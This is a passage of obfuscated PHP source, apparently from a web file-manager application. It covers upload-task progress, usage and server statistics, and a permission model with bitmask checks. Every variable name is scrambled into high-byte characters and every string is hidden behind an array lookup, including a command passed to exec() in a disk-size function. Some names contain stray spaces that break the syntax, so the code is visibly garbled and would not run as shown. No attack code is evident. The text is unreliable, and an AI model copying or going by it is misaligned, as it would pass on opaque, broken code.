$£İ»Ä™[1722])); } public function updateAfter() { $½¶Ã—ŞÏ =& $_SERVER[ë¦»ºéÌ]; $öûßÑ =& $this->task; if (!$öûßÑ[$½¶Ã—ŞÏ[770]] || !$öûßÑ[$½¶Ã—ŞÏ[747]]) { return; } if ($öûßÑ[$½¶Ã—ŞÏ[1724]] == $½¶Ã—ŞÏ[1177]) { $™ö„œ©Ô = $öûßÑ[$½¶Ã—ŞÏ[1681]]; if ($öûßÑ[$½¶Ã—ŞÏ[1682]] != $½¶Ã—ŞÏ[1177]) { $™ö„œ©Ô = 0; } $£¬£âçå = ($öûßÑ[$½¶Ã—ŞÏ[1685]] + $™ö„œ©Ô) / $öûßÑ[$½¶Ã—ŞÏ[747]]; $öûßÑ[$½¶Ã—ŞÏ[1634]] = $£¬£âçå * 0.3; } else { if ($öûßÑ[$½¶Ã—ŞÏ[1724]] == $½¶Ã—ŞÏ[319]) { $£¬£âçå = $öûßÑ[$½¶Ã—ŞÏ[1633]] / $öûßÑ[$½¶Ã—ŞÏ[770]]; $öûßÑ[$½¶Ã—ŞÏ[1634]] = 0.3 + $£¬£âçå * 0.5; } else { if ($öûßÑ[$½¶Ã—ŞÏ[1724]] == $½¶Ã—ŞÏ[118]) { $£¬£âçå = 0; if ($öûßÑ[$½¶Ã—ŞÏ[1680]]) { $£¬£âçå = $öûßÑ[$½¶Ã—ŞÏ[1681]] / $öûßÑ[$½¶Ã—ŞÏ[1680]]; } $öûßÑ[$½¶Ã—ŞÏ[1634]] = 0.3 + 0.5 + $£¬£âçå * 0.2; } } } if ($öûßÑ[$½¶Ã—ŞÏ[1634]] > 0) { $Ñä»“æÜ = timeFloat() - $öûßÑ[$½¶Ã—ŞÏ[1636]] - $öûßÑ[$½¶Ã—ŞÏ[1639]]; $öûßÑ[$½¶Ã—ŞÏ[1640]] = $Ñä»“æÜ * (1 - $öûßÑ[$½¶Ã—ŞÏ[1634]]) / $öûßÑ[$½¶Ã—ŞÏ[1634]]; } } public function copyFileStart($Ìºª€îë, $ª‚Íà€ó, $ÓÁÊ©°ì, $¹¡»ã²Ö, $…úô‘À, $òÍ²ª®Ó) { $†¶šÛ½ô =& $_SERVER[ë¦»ºéÌ]; parent::copyFileStart($Ìºª€îë, $ª‚Íà€ó, $ÓÁÊ©°ì, $¹¡»ã²Ö, $…úô‘À, $òÍ²ª®Ó); $’ÊÃÖÙ„ =& $this->task; if ($’ÊÃÖÙ„[$†¶šÛ½ô[1724]] == $†¶šÛ½ô[319]) { $’ÊÃÖÙ„[$†¶šÛ½ô[1724]] = $†¶šÛ½ô[118]; } $this->update(); } public function copyFileEnd($”É´ØÂ…, $…ã©“, $¢©ƒƒÚœ, $÷³‹áÂ½, $ñóÛËâƒ, $‚¢³¼¥) { $Å¿ó²œ =& $_SERVER[ë¦»ºéÌ]; $Ñ¾ÁïÂä =& $this->task; $Ñ¾ÁïÂä[$Å¿ó²œ[1681]] = $Ñ¾ÁïÂä[$Å¿ó²œ[1680]]; $Ñ¾ÁïÂä[$Å¿ó²œ[1685]] += $Ñ¾ÁïÂä[$Å¿ó²œ[1680]]; $Ñ¾ÁïÂä[$Å¿ó²œ[1682]] = $Å¿ó²œ[12]; $this->update(); } public function nameParse($¨†ÃãÅÇ) { $¯¨Şµó× =& $_SERVER[ë¦»ºéÌ]; $«ØœßŸß =& $this->task; if ($«ØœßŸß[$¯¨Şµó×[1633]] < $«ØœßŸß[$¯¨Şµó×[770]]) { $–È••û‚ = get_path_this($¨†ÃãÅÇ); if (strstr($–È••û‚, $¯¨Şµó×[10])) { $«ØœßŸß[$¯¨Şµó×[1633]] += 1; } } if ($«ØœßŸß[$¯¨Şµó×[1724]] == $¯¨Şµó×[1177]) { $«ØœßŸß[$¯¨Şµó×[1724]] = $¯¨Şµó×[319]; } $«ØœßŸß[$¯¨Şµó×[1678]] = $¨†ÃãÅÇ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($–¼¼¹†´) { $ã“ãê¥´ =& $_SERVER[ë¦»ºéÌ]; $İõ¾¤Ñß = array($ã“ãê¥´[596] => array($ã“ãê¥´[43] => $ã“ãê¥´[1729], $ã“ãê¥´[279] => array($ã“ãê¥´[231], $ã“ãê¥´[749], $ã“ãê¥´[1730], $ã“ãê¥´[1731])), $ã“ãê¥´[1732] => array($ã“ãê¥´[43] => $ã“ãê¥´[1733], $ã“ãê¥´[279] => array($ã“ãê¥´[231], $ã“ãê¥´[747], $ã“ãê¥´[1734], $ã“ãê¥´[1735], $ã“ãê¥´[1736]))); if (!isset($İõ¾¤Ñß[$–¼¼¹†´])) { return !1; } $this->optionType = $İõ¾¤Ñß[$–¼¼¹†´][$ã“ãê¥´[43]]; $this->field = $İõ¾¤Ñß[$–¼¼¹†´][$ã“ãê¥´[279]]; return !0; } public function listData($™ÀÉ¤ıÒ = false, $³§Àşü = "\155\157\144\151\146\x79\124\151\155\145", $ï¬ĞÇ‘ = false) { return parent::listData($™ÀÉ¤ıÒ, $³§Àşü, $ï¬ĞÇ‘); } public function trendList($Ç®³„Ş) { $¨õßÔÏ© =& $_SERVER[ë¦»ºéÌ]; $¥¶“Éù = $this->listData(); if ($¥¶“Éù) { $÷ø²ƒÓè = end($¥¶“Éù); $Êî»ùÇ§ = date($¨õßÔÏ©[1737], strtotime($¨õßÔÏ©[1738])); if ($÷ø²ƒÓè[$¨õßÔÏ©[231]] == $Êî»ùÇ§) { return $¥¶“Éù; } $æøÍüÈ“ = strtotime($÷ø²ƒÓè[$¨õßÔÏ©[231]]); } if (!isset($æøÍüÈ“)) { $Ûë’Ã’µ = $Ç®³„Ş == $¨õßÔÏ©[596] ? $¨õßÔÏ©[540] : $¨õßÔÏ©[809]; $æøÍüÈ“ = Model($Ûë’Ã’µ)->min($¨õßÔÏ©[205]); } $¡÷²Ş¤ü = $¨õßÔÏ©[1739] . ucfirst($Ç®³„Ş); $ö›‚ å = $this->dateList($æøÍüÈ“); foreach ($ö›‚ å as $Êî»ùÇ§) { $this->{$¡÷²Ş¤ü}($Êî»ùÇ§); } return $this->listData(); } private function dateList($¥Ì´¦õù) { $—ƒŒáËØ =& $_SERVER[ë¦»ºéÌ]; $‘úÚ˜¸­ = $¥Ì´¦õù; $®ÆˆÂúº = strtotime($—ƒŒáËØ[1738]); $±ÈÂßÛ = array(); while ($‘úÚ˜¸­ <= $®ÆˆÂúº) { $±ÈÂßÛ[] = date($—ƒŒáËØ[1737], $‘úÚ˜¸­); $‘úÚ˜¸­ = strtotime($—ƒŒáËØ[1740], $‘úÚ˜¸­); } return $±ÈÂßÛ; } public function _recordUser($Í›‡¾êœ = '') { $Ä÷ş¤«ì =& $_SERVER[ë¦»ºéÌ]; $‡ŸÓİ = strtotime(date($Ä÷ş¤«ì[1741], strtotime($Í›‡¾êœ))); $–ûèØÛÁ = strtotime(date($Ä÷ş¤«ì[1742], strtotime($Í›‡¾êœ))); $¯ĞŞÚíµ = array($Ä÷ş¤«ì[205] => array($Ä÷ş¤«ì[993], $–ûèØÛÁ)); $Éõ©¦Ã‡ = Model($Ä÷ş¤«ì[540])->where($¯ĞŞÚíµ)->count($Ä÷ş¤«ì[1632]); $¯ĞŞÚíµ[$Ä÷ş¤«ì[205]] = array($Ä÷ş¤«ì[339], array($‡ŸÓİ, $–ûèØÛÁ)); $‚êóà = Model($Ä÷ş¤«ì[540])->where($¯ĞŞÚíµ)->count($Ä÷ş¤«ì[1632]); $¯ĞŞÚíµ[$Ä÷ş¤«ì[43]] = $Ä÷ş¤«ì[1743]; $…ˆÃáû = Model($Ä÷ş¤«ì[1744])->where($¯ĞŞÚíµ)->count($Ä÷ş¤«ì[1745]); $ï“á¹Õ = array($Ä÷ş¤«ì[231] => $Í›‡¾êœ, $Ä÷ş¤«ì[749] => (int) $Éõ©¦Ã‡, $Ä÷ş¤«ì[1730] => (int) $‚êóà, $Ä÷ş¤«ì[1731] => (int) $…ˆÃáû); return $this->insert($ï“á¹Õ); } public function _recordStore($ŒÒó Éí = '') { $¡Ïú¯Ù€ =& $_SERVER[ë¦»ºéÌ]; $ÙÔÁ×½… = strtotime(date($¡Ïú¯Ù€[1742], strtotime($ŒÒó Éí))); $öÏÈ‚ì– = array($¡Ïú¯Ù€[205] => array($¡Ïú¯Ù€[993], $ÙÔÁ×½…)); $¶ûŸÊŞ = Model($¡Ïú¯Ù€[472])->where($öÏÈ‚ì–)->sum($¡Ïú¯Ù€[90]); $öÏÈ‚ì–[$¡Ïú¯Ù€[413]] = 0; $µ‡»¬úÚ = Model($¡Ïú¯Ù€[809])->where($öÏÈ‚ì–)->sum($¡Ïú¯Ù€[90]); $öÏÈ‚ì–[$¡Ïú¯Ù€[414]] = 1; $Øâ¨Šô = Model($¡Ïú¯Ù€[809])->where($öÏÈ‚ì–)->sum($¡Ïú¯Ù€[90]); $öÏÈ‚ì–[$¡Ïú¯Ù€[414]] = 2; $±â°¦ÆÈ = Model($¡Ïú¯Ù€[809])->where($öÏÈ‚ì–)->sum($¡Ïú¯Ù€[90]); $àò’öÎø = array($¡Ïú¯Ù€[231] => $ŒÒó Éí, $¡Ïú¯Ù€[747] => (int) $µ‡»¬úÚ, $¡Ïú¯Ù€[1734] => (int) $¶ûŸÊŞ, $¡Ïú¯Ù€[1735] => (int) $Øâ¨Šô, $¡Ïú¯Ù€[1736] => (int) $±â°¦ÆÈ); return $this->insert($àò’öÎø); } public function trend($åã“¢œÛ, $ßŞöŒò) { $¹Ğ¾˜ÜÈ =& $_SERVER[ë¦»ºéÌ]; if (!$this->init($åã“¢œÛ)) { return !1; } $øÊ¤µÖ• = $this->trendList($åã“¢œÛ); if ($øÊ¤µÖ• && $ßŞöŒò != $¹Ğ¾˜ÜÈ[1605]) { $ˆÄèÌŸó = $øÊ¤µÖ•[0][$¹Ğ¾˜ÜÈ[231]]; $÷¯”Šš« = $this->validDate($ßŞöŒò, $ˆÄèÌŸó); $ƒÜ¯íß÷ = array(); $şĞï×Ö” = array_to_keyvalue($øÊ¤µÖ•, $¹Ğ¾˜ÜÈ[231]); foreach ($÷¯”Šš« as $€ç°¢”©) { if (isset($şĞï×Ö”[$€ç°¢”©])) { $úØ¨Å«Ò = $şĞï×Ö”[$€ç°¢”©]; } else { $úØ¨Å«Ò = end($øÊ¤µÖ•); $úØ¨Å«Ò[$¹Ğ¾˜ÜÈ[231]] = $€ç°¢”©; if ($åã“¢œÛ == $¹Ğ¾˜ÜÈ[596]) { $úØ¨Å«Ò[$¹Ğ¾˜ÜÈ[1730]] = $úØ¨Å«Ò[$¹Ğ¾˜ÜÈ[1731]] = 0; } } $ƒÜ¯íß÷[] = $úØ¨Å«Ò; } $øÊ¤µÖ• = $ƒÜ¯íß÷; } $ùõöÙáå = array($¹Ğ¾˜ÜÈ[596] => array($¹Ğ¾˜ÜÈ[749] => LNG($¹Ğ¾˜ÜÈ[1746]), $¹Ğ¾˜ÜÈ[1730] => LNG($¹Ğ¾˜ÜÈ[1747]), $¹Ğ¾˜ÜÈ[1731] => LNG($¹Ğ¾˜ÜÈ[1748])), $¹Ğ¾˜ÜÈ[1732] => array($¹Ğ¾˜ÜÈ[747] => LNG($¹Ğ¾˜ÜÈ[1749]), $¹Ğ¾˜ÜÈ[1734] => LNG($¹Ğ¾˜ÜÈ[1750]), $¹Ğ¾˜ÜÈ[1735] => LNG($¹Ğ¾˜ÜÈ[1751]), $¹Ğ¾˜ÜÈ[1736] => LNG($¹Ğ¾˜ÜÈ[1752]))); $¯€ÌâÌû = array($¹Ğ¾˜ÜÈ[596] => $¹Ğ¾˜ÜÈ[1753], $¹Ğ¾˜ÜÈ[1732] => $¹Ğ¾˜ÜÈ[90]); if (empty($øÊ¤µÖ•)) { $€ç°¢”© = date($¹Ğ¾˜ÜÈ[1737], strtotime($¹Ğ¾˜ÜÈ[1738])); $ÉãÒ“¤¯ = array($¹Ğ¾˜ÜÈ[231] => $€ç°¢”©); foreach ($ùõöÙáå[$åã“¢œÛ] as $®ïñ¼Ö‚ => $öÀóÅâ‡) { $ÉãÒ“¤¯[$®ïñ¼Ö‚] = 0; } $øÊ¤µÖ•[] = $ÉãÒ“¤¯; } $Ô­©ø› = array(); foreach ($øÊ¤µÖ• as $öÀóÅâ‡) { if ($åã“¢œÛ == $¹Ğ¾˜ÜÈ[1732] && $öÀóÅâ‡[$¹Ğ¾˜ÜÈ[1734]] > $öÀóÅâ‡[$¹Ğ¾˜ÜÈ[747]]) { $öÀóÅâ‡[$¹Ğ¾˜ÜÈ[1734]] = $öÀóÅâ‡[$¹Ğ¾˜ÜÈ[747]]; } foreach ($ùõöÙáå[$åã“¢œÛ] as $®ïñ¼Ö‚ => $“¾‘ºÆã) { $úØ¨Å«Ò = array($¹Ğ¾˜ÜÈ[231] => $öÀóÅâ‡[$¹Ğ¾˜ÜÈ[231]], $¹Ğ¾˜ÜÈ[1532] => $“¾‘ºÆã); $úØ¨Å«Ò[$¯€ÌâÌû[$åã“¢œÛ]] = isset($öÀóÅâ‡[$®ïñ¼Ö‚]) ? $öÀóÅâ‡[$®ïñ¼Ö‚] : 0; $Ô­©ø›[] = $úØ¨Å«Ò; } } return $Ô­©ø›; } public function validDate($ÜÛ”èà‚, $ÊÙˆéÏÚ) { $³¯óĞË =& $_SERVER[ë¦»ºéÌ]; $ÇÉ£¿ß‰ = date($³¯óĞË[1737], strtotime($³¯óĞË[1738])); $®üöôÏ» = array($ÇÉ£¿ß‰); switch ($ÜÛ”èà‚) { case $³¯óĞË[1612]: $úòùÈò = mktime(0, 0, 0, date($³¯óĞË[1754]), date($³¯óĞË[1353]) - date($³¯óĞË[1416]) + 7 - 7, date($³¯óĞË[1755])); $³Û„Š¼¦ = 0; do { $æ½†­“ã = date($³¯óĞË[1737], $úòùÈò - 3600 * 24 * 7 * $³Û„Š¼¦); $®üöôÏ»[] = $æ½†­“ã; $³Û„Š¼¦++; } while ($ÊÙˆéÏÚ < $æ½†­“ã); break; case $³¯óĞË[1610]: $³Û„Š¼¦ = 1; do { $ˆÑí‡ = date($³¯óĞË[1756], strtotime("\x2d\x20{$³Û„Š¼¦}\x20\x6d\157\x6e\164\150\163")); $®üöôÏ»[] = $ˆÑí‡; $³Û„Š¼¦++; } while ($ÊÙˆéÏÚ < $ˆÑí‡); break; case $³¯óĞË[1757]: $Ö·éß†¨ = (int) date($³¯óĞË[1755], strtotime($ÊÙˆéÏÚ)); $ç–µÚ… = (int) date($³¯óĞË[1755]); if ($Ö·éß†¨ >= $ç–µÚ…) { break; } for ($Ö·éß†¨; $Ö·éß†¨ < $ç–µÚ…; $Ö·éß†¨++) { $®üöôÏ»[] = $Ö·éß†¨ . $³¯óĞË[1758]; } break; default: break; } if ($ÊÙˆéÏÚ > end($®üöôÏ»)) { array_pop($®üöôÏ»); } sort($®üöôÏ»); return $®üöôÏ»; } public function listTable($şœáªŠ) { $™ÖØ‡ƒÁ = ucfirst($şœáªŠ); return Model($™ÖØ‡ƒÁ)->listData(); } public function option($í¦­êˆÇ) { $¬¿‡ôì† = $_SERVER[ë¦»ºéÌ][1759] . ucfirst($í¦­êˆÇ); return $this->{$¬¿‡ôì†}(); } private function optionUser() { $æñõäç¹ =& $_SERVER[ë¦»ºéÌ]; $ì¨Í°ò® = Model($æñõäç¹[540])->count($æñõäç¹[1632]); $ñ’é€²° = Model($æñõäç¹[540])->where($æñõäç¹[1760])->count($æñõäç¹[1632]); $ŒĞÅÑ¹× = intval($GLOBALS[$æñõäç¹[6]][$æñõäç¹[355]][$æñõäç¹[1588]]) / 3600; $˜æß”¸” = strtotime("\55{$ŒĞÅÑ¹×}\40\x68\x6f\x75\162\163"); $êö¦ÔÚ = strtotime(date($æñõäç¹[1741])); if ($˜æß”¸” < $êö¦ÔÚ) { $˜æß”¸” = $êö¦ÔÚ; } $¬ıİ·à¤ = array($æñõäç¹[1761] => array($æñõäç¹[994], $˜æß”¸”)); $áÓ‹¢’µ = (int) Model($æñõäç¹[540])->where($¬ıİ·à¤)->count($æñõäç¹[1632]); if (!$áÓ‹¢’µ) { $áÓ‹¢’µ = 1; } $¬ıİ·à¤ = array($æñõäç¹[1761] => array($æñõäç¹[994], $êö¦ÔÚ)); $õÓôÎÀŸ = Model($æñõäç¹[540])->where($¬ıİ·à¤)->count($æñõäç¹[1632]); return array($æñõäç¹[743] => (int) $ì¨Í°ò®, $æñõäç¹[1762] => (int) ($ì¨Í°ò® - $ñ’é€²°), $æñõäç¹[1763] => (int) $ñ’é€²°, $æñõäç¹[1764] => (int) $õÓôÎÀŸ, $æñõäç¹[1765] => $áÓ‹¢’µ); } private function optionFile() { $µÖêåæ =& $_SERVER[ë¦»ºéÌ]; $®Æü¡äÀ = $this->sourceSize(); $×„Ôœæµ = $®Æü¡äÀ[$µÖêåæ[90]]; $ÔÕ»ÕïÚ = $®Æü¡äÀ[$µÖêåæ[1734]]; $ÃØ¯˜ÜË = Model($µÖêåæ[809])->where(array($µÖêåæ[413] => 0))->count($µÖêåæ[405]); $úü¹ ›Ä = array($µÖêåæ[413] => 0, $µÖêåæ[205] => array($µÖêåæ[994], strtotime(date($µÖêåæ[1741])))); $» ëŸü = Model($µÖêåæ[809])->where($úü¹ ›Ä)->sum($µÖêåæ[90]); $¦‰İ›€ = Model($µÖêåæ[809])->where($úü¹ ›Ä)->count($µÖêåæ[405]); return array($µÖêåæ[747] => $×„Ôœæµ, $µÖêåæ[1734] => $ÔÕ»ÕïÚ, $µÖêåæ[1766] => $×„Ôœæµ - $ÔÕ»ÕïÚ, $µÖêåæ[1767] => (int) $» ëŸü, $µÖêåæ[749] => (int) $ÃØ¯˜ÜË, $µÖêåæ[1768] => (int) $¦‰İ›€); } private function optionAccess() { $ÙÇ¬¡ğ =& $_SERVER[ë¦»ºéÌ]; return array($ÙÇ¬¡ğ[743] => $this->typeLogCnt(), $ÙÇ¬¡ğ[118] => $this->typeLogCnt($ÙÇ¬¡ğ[118]), $ÙÇ¬¡ğ[452] => $this->typeLogCnt($ÙÇ¬¡ğ[452]), $ÙÇ¬¡ğ[1769] => $this->typeLogCnt($ÙÇ¬¡ğ[1769]), $ÙÇ¬¡ğ[1770] => $this->typeLogCnt($ÙÇ¬¡ğ[1770]), $ÙÇ¬¡ğ[596] => $this->typeLogCnt($ÙÇ¬¡ğ[12], $ÙÇ¬¡ğ[1745])); } private function typeLogCnt($Éøåƒ‹ç = '', $ûåÕŠ“² = "\151\x64") { $¡ÌÎíŞõ =& $_SERVER[ë¦»ºéÌ]; $¥ˆ¹“åÂ = array($¡ÌÎíŞõ[118] => array($¡ÌÎíŞõ[1771], $¡ÌÎíŞõ[1772]), $¡ÌÎíŞõ[452] => array($¡ÌÎíŞõ[1773], $¡ÌÎíŞõ[1774]), $¡ÌÎíŞõ[1769] => array($¡ÌÎíŞõ[1775], $¡ÌÎíŞõ[1776], $¡ÌÎíŞõ[1777]), $¡ÌÎíŞõ[1770] => array($¡ÌÎíŞõ[1778], $¡ÌÎíŞõ[1779]), $¡ÌÎíŞõ[1780] => array($¡ÌÎíŞõ[1781], $¡ÌÎíŞõ[1782], $¡ÌÎíŞõ[1783])); $‰É¡óÅÃ = strtotime(date($¡ÌÎíŞõ[1741])); $ÓÛÉÀÇË = array($¡ÌÎíŞõ[205] => array($¡ÌÎíŞõ[994], $‰É¡óÅÃ)); if ($Éøåƒ‹ç) { $ÓÛÉÀÇË[$¡ÌÎíŞõ[43]] = array($¡ÌÎíŞõ[7], $¥ˆ¹“åÂ[$Éøåƒ‹ç]); } $Ğ Áí¤Ã = Model($¡ÌÎíŞõ[1744])->where($ÓÛÉÀÇË)->count($ûåÕŠ“²); return (int) $Ğ Áí¤Ã; } private function optionServer() { $’¦ıİ¢¹ =& $_SERVER[ë¦»ºéÌ]; $­‘¨—¦ = $this->diskDriver(); $¦‡öµîİ = KodIO::defaultDriver(); $àÑŞñİÊ = array($’¦ıİ¢¹[801] => $¦‡öµîİ[$’¦ıİ¢¹[403]]); $Ÿ¦™«óç = Model($’¦ıİ¢¹[472])->where($àÑŞñİÊ)->sum($’¦ıİ¢¹[90]); $«ü¸—å = explode($’¦ıİ¢¹[63], $_SERVER[$’¦ıİ¢¹[152]]); $Çâ®€Ç° = $«ü¸—å[0]; $“ª…©® = $GLOBALS[$’¦ıİ¢¹[6]][$’¦ıİ¢¹[31]]; $ìá‡ïò = $“ª…©®[$’¦ıİ¢¹[956]]; if ($ìá‡ïò == $’¦ıİ¢¹[944]) { $Œ´ÅÓÅû = explode($’¦ıİ¢¹[1250], $“ª…©®[$’¦ıİ¢¹[955]]); $ìá‡ïò = $Œ´ÅÓÅû[0]; } if ($ìá‡ïò == $’¦ıİ¢¹[892] || $ìá‡ïò == $’¦ıİ¢¹[788]) { $­§İßÚ„ = Model()->db()->query($’¦ıİ¢¹[1784]); $Õ¤ËšÕï = $­§İßÚ„[0] && isset($­§İßÚ„[0][$’¦ıİ¢¹[1531]]) ? $­§İßÚ„[0][$’¦ıİ¢¹[1531]] : 0; $ìá‡ïò = $’¦ıİ¢¹[1785] . ($Õ¤ËšÕï ? $’¦ıİ¢¹[8] . $Õ¤ËšÕï : $’¦ıİ¢¹[12]); } $ô×›×ËÈ = $GLOBALS[$’¦ıİ¢¹[6]][$’¦ıİ¢¹[355]][$’¦ıİ¢¹[811]]; return array($’¦ıİ¢¹[1786] => $­‘¨—¦ ? $­‘¨—¦[$’¦ıİ¢¹[1787]] : 0, $’¦ıİ¢¹[1788] => $­‘¨—¦ ? $­‘¨—¦[$’¦ıİ¢¹[1789]] : 0, $’¦ıİ¢¹[1790] => (int) $¦‡öµîİ[$’¦ıİ¢¹[1787]] * 1024 * 1024 * 1024, $’¦ıİ¢¹[1791] => (int) $Ÿ¦™«óç, $’¦ıİ¢¹[1792] => ucfirst($Çâ®€Ç°), $’¦ıİ¢¹[1793] => $’¦ıİ¢¹[1794] . PHP_VERSION, $’¦ıİ¢¹[1795] => phpBuild64() ? 64 : 32, $’¦ıİ¢¹[742] => str_replace($’¦ıİ¢¹[1110], $’¦ıİ¢¹[972], $ìá‡ïò), $’¦ıİ¢¹[355] => ucfirst($ô×›×ËÈ), $’¦ıİ¢¹[42] => $_SERVER[$’¦ıİ¢¹[1796]]); } private function diskDriver() { $­È×¬ìÌ =& $_SERVER[ë¦»ºéÌ]; $Ó‘Ã­ËÖ = $­È×¬ìÌ[8]; $·Öåëµ = $GLOBALS[$­È×¬ìÌ[6]][$­È×¬ìÌ[1266]] == $­È×¬ìÌ[1267]; if ($·Öåëµ) { $Ó‘Ã­ËÖ = $­È×¬ìÌ[1797]; if (function_exists($­È×¬ìÌ[1798])) { exec($­È×¬ìÌ[1799], $ÎƒÛêÎ¼); $Ó‘Ã­ËÖ = $ÎƒÛêÎ¼[1] . $­È×¬ìÌ[8]; } } if (!file_exists($Ó‘Ã­ËÖ)) { return; } $À”ÌÖ¿Ó = @disk_total_space($Ó‘Ã­ËÖ); $Ùã€ìú¿ = $À”ÌÖ¿Ó - @disk_free_space($Ó‘Ã­ËÖ); return array($­È×¬ìÌ[1787] => $À”ÌÖ¿Ó, $­È×¬ìÌ[1789] => $Ùã€ìú¿); } public function fileChart($ñòÓãßÌ) { $Ëàµ™– =& $_SERVER[ë¦»ºéÌ]; if (isset($ñòÓãßÌ[$Ëàµ™–[1632]])) { return Model($Ëàµ™–[809])->userFileTypeProfile($ñòÓãßÌ[$Ëàµ™–[1632]]); } if (isset($ñòÓãßÌ[$Ëàµ™–[1800]])) { return Model($Ëàµ™–[809])->groupFileTypeProfile($ñòÓãßÌ[$Ëàµ™–[1800]]); } $ÔÀö×üó = $this->sourceSize(); $„Ïê››Á = array($Ëàµ™–[500] => 0, $Ëàµ™–[414] => 1); $ÉªÂÕì = Model($Ëàµ™–[809])->where($„Ïê››Á)->sum($Ëàµ™–[90]); $„Ïê››Á[$Ëàµ™–[414]] = 2; $Ï‡¥ó„ = Model($Ëàµ™–[809])->where($„Ïê››Á)->sum($Ëàµ™–[90]); return array($Ëàµ™–[747] => $ÔÀö×üó[$Ëàµ™–[90]], $Ëàµ™–[1734] => $ÔÀö×üó[$Ëàµ™–[1734]], $Ëàµ™–[1735] => (int) $ÉªÂÕì, $Ëàµ™–[1736] => (int) $Ï‡¥ó„); } private function sourceSize() { $ØÌíÜæ« =& $_SERVER[ë¦»ºéÌ]; $­Åô‚¶¢ = Model($ØÌíÜæ«[809])->where(array($ØÌíÜæ«[413] => 0))->sum($ØÌíÜæ«[90]); $Ñ‰ˆéÏÙ = Model($ØÌíÜæ«[472])->sum($ØÌíÜæ«[90]); if ($Ñ‰ˆéÏÙ > $­Åô‚¶¢) { $Ñ‰ˆéÏÙ = $­Åô‚¶¢; } return array($ØÌíÜæ«[90] => (int) $­Åô‚¶¢, $ØÌíÜæ«[1734] => (int) $Ñ‰ˆéÏÙ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¦ş«Øê =& $_SERVER[ë¦»ºéÌ]; $ò¯÷»Û = array(array($¦ş«Øê[423] => LNG($¦ş«Øê[1801]), $¦ş«Øê[1802] => $¦ş«Øê[1803], $¦ş«Øê[1804] => 1, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦ş«Øê[423] => LNG($¦ş«Øê[1807]), $¦ş«Øê[1802] => $¦ş«Øê[1808], $¦ş«Øê[1804] => 2, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦ş«Øê[423] => LNG($¦ş«Øê[1809]), $¦ş«Øê[1802] => $¦ş«Øê[1810], $¦ş«Øê[1804] => 3, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦ş«Øê[423] => LNG($¦ş«Øê[1811]), $¦ş«Øê[1802] => $¦ş«Øê[1812], $¦ş«Øê[1804] => 4, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => self::AUTH_SHOW | self::AUTH_VIEW), array($¦ş«Øê[423] => LNG($¦ş«Øê[1813]), $¦ş«Øê[1802] => $¦ş«Øê[1814], $¦ş«Øê[1804] => 5, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¦ş«Øê[423] => LNG($¦ş«Øê[1815]), $¦ş«Øê[1802] => $¦ş«Øê[1816], $¦ş«Øê[1804] => 6, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¦ş«Øê[423] => LNG($¦ş«Øê[1817]), $¦ş«Øê[1802] => $¦ş«Øê[1818], $¦ş«Øê[1804] => 7, $¦ş«Øê[1805] => 1, $¦ş«Øê[1806] => 0)); return $ò¯÷»Û; } public static function authCheck($áÒıû¦, $ÅËˆÕûú) { $áÒıû¦ = intval($áÒıû¦); if ($GLOBALS[$_SERVER[ë¦»ºéÌ][507]]) { return !0; } if ($áÒıû¦ <= 0) { return !1; } if (($áÒıû¦ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($áÒıû¦ & $ÅËˆÕûú); } public static function authCheckShow($Á„ÍÊÈã) { return self::authCheck($Á„ÍÊÈã, self::AUTH_SHOW); } public static function authCheckView($íğÒµñ¡) { return self::authCheck($íğÒµñ¡, self::AUTH_VIEW); } public static function authCheckDownload($ŠÊ©š˜´) { return self::authCheck($ŠÊ©š˜´, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ú†‘¼˜ã) { return self::authCheck($Ú†‘¼˜ã, self::AUTH_UPLOAD); } public static function authCheckEdit($”àÁÛ˜) { return self::authCheck($”àÁÛ˜, self::AUTH_EDIT); } public static function authCheckRemove($ƒÛàî‹‚) { return self::authCheck($ƒÛàî‹‚, self::AUTH_REMOVE); } public static function authCheckShare($°ˆ¦’°”) { return self::authCheck($°ˆ¦’°”, self::AUTH_SHARE); } public static function authCheckComment($÷¨Üì€î) { return self::authCheck($÷¨Üì€î, self::AUTH_COMMENT); } public static function authCheckEvent($´ Ï†åµ) { return self::authCheck($´ Ï†åµ, self::AUTH_EVENT); } public static function authCheckRoot($«äô‚Ôï) { return self::authCheck($«äô‚Ôï, self::AUTH_ROOT); } public static function authCheckAction($ÅÀÒûß€, $¹¥ğ€Š°) { $òÚ¡øì =& $_SERVER[ë¦»ºéÌ]; $ˆ÷ÖÂ¹ï = array($òÚ¡øì[1819] => self::AUTH_VIEW, $òÚ¡øì[1177] => self::AUTH_DOWNLOAD, $òÚ¡øì[118] => self::AUTH_UPLOAD, $òÚ¡øì[1770] => 